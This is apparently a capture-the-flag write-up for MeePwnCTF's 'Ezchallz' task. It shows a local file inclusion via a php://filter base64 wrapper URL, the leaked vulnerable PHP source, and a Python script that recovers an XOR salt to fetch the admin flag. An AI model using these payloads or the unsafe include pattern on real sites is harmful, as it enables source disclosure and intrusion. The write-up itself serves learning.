# Ezchallz (crypto/web, 60 solved, 100p)

In the task we get access to a webpage, where we could register, and we get redirected so a page with some fake flag.
First thing we notice is that registration link is `http://206.189.92.209/ezchallz/?page=register`

So we try some LFI there, and it works, we can do `http://206.189.92.209/ezchallz/?page=index` for example.
So it will include any `php` file.
Not very useful, since we don't have any, but there is another trick we can test here - PHP wrappers.
We place base64 encode wrapper: `http://206.189.92.209/ezchallz/?page=php://filter/read=convert.base64-encode/resource=index`
And we can recover the source code of the index and register files.

Index has just:

```php
<?php
if(isset($_GET["page"]) && !empty($_GET["page"])) {
    $page = $_GET["page"];
    if(strpos(strtolower($page), 'secret') !== false) {
        die('No no no!');
    }
//    else if(strpos($page, 'php') !== false) {
 //       die("N0 n0 n0!");
//    }
    else {
        include($page . '.php');
    }
}
?>
```

So we can get anything but `secret.php`.
Register has more interesting stuff:

```php
<?php
error_reporting(0);

function gendirandshowflag($username) {
	include('secret.php');
	$dname = "";
	$intro = "";
	$_username = md5($username, $raw_output = TRUE);
	for($i = 0; $i<strlen($salt); $i++) {
		$dname.= chr(ord($salt[$i]) ^ ord($_username[$i]));
	};
	$dname = "users/" . bin2hex($dname);
	echo 'You have successfully register as ' . $username . '!\n';
	if ($_username === hex2bin('21232f297a57a5a743894a0e4a801fc3')) {
		$intro = "Here is your flag:" . $flag;
	}
	else {
		$intro = "Here is your flag, but I'm not sure 🤔: \nMeePwnCTF{" . md5(random_bytes(16) . $username) . "}";
	}
	mkdir($dname);
	file_put_contents($dname . '/flag.php', $intro);
	header("Location: ". $dname . "/flag.php");
}

if (isset($_POST['username'])) {
	if ($_POST['username'] === 'admin') {
		die('Username is not allowed!');
	}
	else {
		gendirandshowflag($_POST['username']);
	}
}
?>
```

We can see that:

1. Directory name we get is constructed by XORing md5 of our username with some secret salt. 
2. If the md5 of username we provide matches some random bytes, we get message `Here is your flag:` with the real flag.

We can't really break this md5 of the special user, but since we can calculate md5 of our username, we can XOR this value with directory name we got to recover the salt.
Now we know both the salt and md5 of special user, so we can calculate the real flag directory:

```python
import hashlib
import requests
from crypto_commons.generic import xor_string


def main():
    username = "test"
    plain = hashlib.md5(username).digest()
    our_dir = "b8240bb93fb5c4321196ff675b7f98eb".decode("hex")
    salt = xor_string(our_dir, plain)
    admin = xor_string(hashlib.md5("admin").digest(), salt)
    admin_dir = admin.encode("hex")
    print((requests.get("http://206.189.92.209/ezchallz/users/%s/flag.php" % admin_dir)).text)


main()
```

And we get: `MeePwnCTF{just-a-warmup-challenge-are-you-ready-for-hacking-others-challz?}`
